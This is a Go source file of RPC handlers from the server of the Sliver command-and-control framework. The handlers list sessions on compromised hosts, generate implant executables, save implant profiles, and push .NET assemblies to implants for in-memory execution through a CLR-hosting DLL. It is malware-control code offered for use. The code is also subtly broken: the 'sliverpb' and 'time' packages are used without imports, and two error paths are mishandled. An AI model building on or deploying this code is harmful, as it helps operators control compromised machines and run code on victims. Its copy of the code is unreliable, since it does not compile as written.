package rpc

import (
	"errors"
	"io/ioutil"
	"log"
	"path"
	pb "sliver/protobuf/client"
	"sliver/server/assets"
	"sliver/server/core"
	"sliver/server/generate"

	"github.com/golang/protobuf/proto"
)

func rpcSessions(_ []byte, resp RPCResponse) {
	sessions := &pb.Sessions{}
	if 0 < len(*core.Hive.Slivers) {
		for _, sliver := range *core.Hive.Slivers {
			sessions.Slivers = append(sessions.Slivers, &pb.Sliver{
				ID:            sliver.ID,
				Name:          sliver.Name,
				Hostname:      sliver.Hostname,
				Username:      sliver.Username,
				UID:           sliver.UID,
				GID:           sliver.GID,
				OS:            sliver.Os,
				Arch:          sliver.Arch,
				Transport:     sliver.Transport,
				RemoteAddress: sliver.RemoteAddress,
				PID:           sliver.PID,
				Filename:      sliver.Filename,
			})
		}
	}
	data, err := proto.Marshal(sessions)
	if err != nil {
		log.Printf("Error encoding rpc response %v", err)
	}
	resp(data, err)
}

func rpcGenerate(req []byte, resp RPCResponse) {
	genReq := &pb.GenerateReq{}
	err := proto.Unmarshal(req, genReq)
	if err != nil {
		resp([]byte{}, err)
		return
	}
	config := generate.SliverConfigFromProtobuf(genReq.Config)
	fpath, err := generate.SliverExecutable(config)
	if err != nil {
		resp([]byte{}, err)
		return
	}
	filename := path.Base(fpath)
	filedata, err := ioutil.ReadFile(fpath)
	generated := &pb.Generate{
		File: &pb.File{
			Name: filename,
			Data: filedata,
		},
	}
	data, err := proto.Marshal(generated)
	resp(data, err)
}

func rpcProfiles(_ []byte, resp RPCResponse) {
	profiles := &pb.Profiles{List: []*pb.Profile{}}
	for name, config := range generate.GetProfiles() {
		profiles.List = append(profiles.List, &pb.Profile{
			Name:   name,
			Config: config.ToProtobuf(),
		})
	}
	data, err := proto.Marshal(profiles)
	resp(data, err)
}

func rpcNewProfile(req []byte, resp RPCResponse) {
	profile := &pb.Profile{}
	err := proto.Unmarshal(req, profile)
	if err != nil {
		log.Printf("Failed to decode message %v", err)
		resp([]byte{}, err)
	}
	config := generate.SliverConfigFromProtobuf(profile.Config)
	profile.Name = path.Base(profile.Name)
	if 0 < len(profile.Name) && profile.Name != "." {
		log.Printf("Saving new profile with name %#v", profile.Name)
		err = generate.SaveProfile(profile.Name, config)
	} else {
		err = errors.New("Invalid profile name")
	}
	resp([]byte{}, err)
}

func rpcExecuteAssembly(req []byte, resp RPCResponse) {
	execReq := &sliverpb.ExecuteAssemblyReq{}
	err := proto.Unmarshal(req, execReq)
	if err != nil {
		resp([]byte{}, err)
		return
	}
	sliver := (*core.Hive.Slivers)[int(execReq.SliverID)]
	if sliver == nil {
		resp([]byte{}, err)
		return
	}
	hostingDllPath := assets.GetDataDir() + "/HostingCLRx64.dll"
	hostingDllBytes, err := ioutil.ReadFile(hostingDllPath)
	if err != nil {
		resp([]byte{}, err)
		return
	}
	data, _ := proto.Marshal(&sliverpb.ExecuteAssemblyReq{
		Assembly:   execReq.Assembly,
		HostingDll: hostingDllBytes,
		Arguments:  execReq.Arguments,
		Timeout:    execReq.Timeout,
		SliverID:   execReq.SliverID,
	})
	timeout := time.Duration(execReq.Timeout) * time.Second
	data, err = sliver.Request(sliverpb.MsgExecuteAssemblyReq, timeout, data)
	resp(data, err)

}
